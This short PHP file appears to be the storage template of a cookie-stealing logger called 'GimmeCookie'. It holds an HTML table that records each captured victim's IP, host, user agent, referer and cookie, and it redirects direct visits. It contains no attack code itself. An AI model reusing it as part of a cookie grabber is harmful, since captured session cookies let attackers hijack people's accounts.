<?PHP
// Protection against unauthorized access
if (!defined('GimmeCookie')) {
    header('Location: ./main');
    die;
}

$storage = '<p><br/>
Cookies:</p>
<table width="726" border="1">
<tr><td>IP:</td><td>Host:</td><td>User-Agent:</td><td>Date:</td><td>Time:</td><td>Referer:</td><td>Cookie:</td></tr>
<!-- Breakpoint -->
</table>
<p>&nbsp;</p>';